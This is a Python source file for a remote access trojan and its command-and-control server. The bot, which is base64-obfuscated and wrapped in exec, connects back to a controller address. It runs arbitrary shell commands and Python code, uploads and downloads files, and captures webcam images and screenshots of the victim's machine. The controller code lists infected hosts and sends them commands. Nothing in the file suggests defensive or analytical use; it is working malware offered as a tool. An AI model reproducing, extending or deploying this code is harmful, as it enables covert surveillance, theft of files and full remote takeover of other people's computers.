# github.com/ycy20090311
# 2023

# Python Library
import time
import socket
import base64
import threading

# Bots Dictionaries
# BotSocket:SystemInfo
Bots = {}

# BotCode StringVariable
BotCode = """
import os
import cv2
import time
import socket
import platform
import subprocess
import pyscreenshot
try:
    BotSocket = socket.socket()
    BotSocket.connect(("{0}",{1}))
    SendMsg = b"systeminfo %b %b %b" % (platform.platform().encode(),platform.node().encode(),platform.machine().encode())
    BotSocket.sendall(SendMsg)
    while True:
        RecvMsg = BotSocket.recv(20)
        if RecvMsg.split()[0] == b"size":
            RecvSize = int(RecvMsg.split(b" ",1)[1])
            RecvMsg = b""
            while len(RecvMsg) < RecvSize:
                RecvMsg += BotSocket.recv(1024)
            try:
                if RecvMsg.split()[0] == b"shell":
                    shell = subprocess.Popen(RecvMsg.split(b" ",1)[1].decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                    SendMsg = b"shell %b" % shell.stdout.read() + shell.stderr.read()
                elif RecvMsg.split()[0] == b"pycode":
                    exec(RecvMsg.split(b" ",1)[1])
                    SendMsg = b"pycode ok"
                elif RecvMsg.split()[0] == b"getfile":
                    SendFile = open(RecvMsg.split(b" ",2)[2],"rb")
                    SendMsg = b"getfile %b %b" % (RecvMsg.split(b" ",2)[1],SendFile.read())
                    SendFile.close()
                elif RecvMsg.split()[0] == b"putfile":
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    SendMsg = b"putfile ok"
                elif RecvMsg.split()[0] == b"webcamsnap":
                    Webcamsnap = cv2.VideoCapture(0)
                    Return,Image = Webcamsnap.read()
                    if Return == True:SendMsg = b"webcamsnap %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
                    else:SendMsg = b"webcamsmap no"
                elif RecvMsg.split()[0] == b"screenshot":
                    Screenshot = pyscreenshot.grab()
                    Screenshot.save(".screenshot.jpg")
                    Screenshot = cv2.imread(".screenshot.jpg")
                    SendMsg = b"screenshot %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Screenshot)[1].tobytes())
                    os.remove(".screenshot.jpg")
                else:
                    SendMsg = b"command no"
            except:
                SendMsg = b"%b no" % RecvMsg.split()[0]
            BotSocket.sendall(b"size %b" % str(len(SendMsg)).encode())
            time.sleep(0.3)
            BotSocket.sendall(SendMsg)
except:
    BotSocket.close()
    exit(0)         
"""

# Generate BotScript
def Generate(FilePath,ControlIp,ControlPort):
    try:
        File = open(FilePath,"w+")
        File.write("import base64;exec(base64.b64decode(%s))" % str(base64.b64encode(str(BotCode.format(ControlIp,ControlPort)).encode())))
        File.close()
        return "generate ok"
    except:
        return "generate no"

# Listen Port
def Listen(ControlHost,ControlPort):
    def ThreadListen():
        try:
            ControlSocket = socket.socket()
            ControlSocket.bind((ControlHost,int(ControlPort)))
            ControlSocket.listen()
            while True:
                BotSocket,BotAddr = ControlSocket.accept()
                RecvMsg = BotSocket.recv(1024)
                if RecvMsg.split()[0] == b"systeminfo":
                    Bots[BotSocket] = "%s %s" % (RecvMsg.split(b" ",1)[1].decode(),BotSocket.getpeername()[0])
        except ConnectionResetError:
            pass
    try:
        threading.Thread(target=ThreadListen).start()
        return "listen ok"
    except:
        return "listen no"
        
# Print Bots
def ListBot():
    BotList = ""
    for BotID in range(len(Bots.keys())):
        Run(BotID,"shell pwd")
    BotSockets = list(Bots.keys())
    for BotSocket in BotSockets:
        BotList += "%s %s\n" % (BotSockets.index(BotSocket),Bots[BotSocket])
    return BotList
    
# RunCommand For Bot
def Run(BotID,Command):
    try:       
        SendMsg = Command.encode()
        BotSocket = list(Bots.keys())[int(BotID)]
        if SendMsg.split()[0] == b"putfile":
            SendFile = open(SendMsg.split(b" ",2)[2],"rb+")
            SendMsg = b"putfile %b %b" % (SendMsg.split(b" ",2)[1],SendFile.read())
            SendFile.close()       
        BotSocket.sendall(b"size %b" % str(len(SendMsg)).encode())
        time.sleep(0.3)
        BotSocket.sendall(SendMsg)
        RecvMsg = BotSocket.recv(20)
        if RecvMsg.split()[0] == b"size":
            RecvSize = int(RecvMsg.split(b" ",1)[1])
            RecvMsg = b""
            while len(RecvMsg) < RecvSize:
                RecvMsg += BotSocket.recv(1024)          
            if RecvMsg.split()[0] in [b"shell",b"pycode",b"putfile"]:
                return RecvMsg.decode()
            elif RecvMsg.split()[0] == b"getfile":
                if RecvMsg.split()[1] == b"no":
                    return "getfile no"
                else:
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    return "getfile ok"
            elif RecvMsg.split()[0] == b"screenshot":
                if RecvMsg.split()[1] == b"no":
                    return "screenshot no"
                else:
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    return "screenshot ok"
            elif RecvMsg.split()[0] == b"webcamsnap":
                if RecvMsg.split()[1] == b"no":
                    return "webcamsnap no"
                else:
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    return "webcamsnap ok"
    except:
        del Bots[BotSocket]
        BotSocket.close()
        return "botsocket no"
